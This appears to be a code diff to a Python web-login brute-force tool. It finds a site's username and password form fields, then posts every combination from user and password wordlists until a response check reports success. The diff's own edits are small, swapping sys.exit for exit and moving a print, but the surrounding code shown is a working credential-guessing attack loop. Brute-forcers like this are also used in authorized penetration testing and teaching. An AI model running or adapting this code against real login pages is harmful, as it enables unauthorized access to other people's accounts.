@@ -2,7 +2,6 @@
 
 import requests
 import re
-import sys
 import argparse
 import signal
 from pwn import *
@@ -83,7 +82,7 @@ def get_fields(args):
     usr_field = match_field(usr_field, usrfielddic)
     pass_field = match_field(pass_field, passfielddic)
     if usr_field == None or pass_field == None:
-        print(f"\n\n\n{fg.RED}[!] Cant find any good login field, sorry...\n{fg.RESET}"); sys.exit(1)
+        print(f"\n\n\n{fg.RED}[!] Cant find any good login field, sorry...\n{fg.RESET}"); exit(1)
     print(f'{fg.GREEN}Got the correct fields lucky bastard!: ' + f"\"{usr_field}\" & \"{pass_field}\"\n{fg.RESET}")
     return (usr_field, pass_field)
 
@@ -121,8 +120,8 @@ def brute_force(usr_field, pass_field, url, usrdic, passdic, errors=None):
         for passw in passdict:
             payload = make_payload(usr_field, pass_field, user, passw)
             print(f'{fg.YELLOW}Trying {fg.RESET}' + f"{fg.RED}{payload[f'{usr_field}']}:{payload[f'{pass_field}']}{fg.RESET}", end="")
-            print(oneliner, end="")
             response = conn(url, "post", payload)
+            print(oneliner, end="")
             if errors != None:
                 if check_errors(response, errors) == True:
                     p2.status(f'{fg.GREEN}Gotcha!!{fg.RESET}')
@@ -155,7 +154,7 @@ def main():
 
 def def_handler(sig, frame):
 	print(f"\n\n\n{fg.RED}[!] Saliendo...{fg.RESET}\n")
-	sys.exit(1)
+	exit(1)
 
 
 
